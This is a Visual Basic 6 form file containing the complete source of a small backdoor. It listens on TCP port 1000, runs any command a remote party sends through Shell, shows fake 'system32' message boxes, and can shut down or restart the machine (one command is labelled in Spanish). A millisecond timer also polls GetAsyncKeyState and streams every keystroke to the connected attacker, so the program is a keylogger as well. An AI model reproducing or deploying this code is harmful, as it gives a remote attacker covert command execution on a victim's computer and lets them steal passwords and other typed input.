VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   1200
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   2490
   LinkTopic       =   "Form1"
   ScaleHeight     =   1200
   ScaleWidth      =   2490
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   240
      Top             =   360
   End
   Begin MSWinsockLib.Winsock sock1 
      Left            =   960
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer

Private Sub Form_Load()
sock1.Close
sock1.LocalPort = "1000"
sock1.Listen

End Sub

Private Sub sock1_Close()
sock1.Close
sock1.Listen

End Sub

Private Sub sock1_ConnectionRequest(ByVal requestID As Long)
sock1.Close
sock1.Accept requestID

End Sub

Private Sub sock1_DataArrival(ByVal bytesTotal As Long)
Dim data As String
Dim vector() As String
sock1.GetData data, vbString
vector() = Split(data, "|")
If vector(0) = "cmd" Then
Shell vector(1)
ElseIf vector(0) = "message" Then
MsgBox vector(1), vbCritical, "system32"
End If

Select Case vector(0)

Case "Shutdown"
Shell "shutdown -s -t 30"

Case "Abort"
Shell "shutdown -a"

Case "Reiniciar"
Shell "shutdown -r -t 25"

End Select




End Sub

Private Sub sock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
sock1.Close
sock1.Listen

End Sub

Private Sub Timer1_Timer()
Dim a1 As Integer
Dim a2 As String
If sock1.State = sckConnected Then
For a1 = 1 To 255
If GetAsyncKeyState(a1) = -32767 Then
a2 = Chr(a1)
sock1.SendData a2
End If
Next a1
Else
End If

End Sub
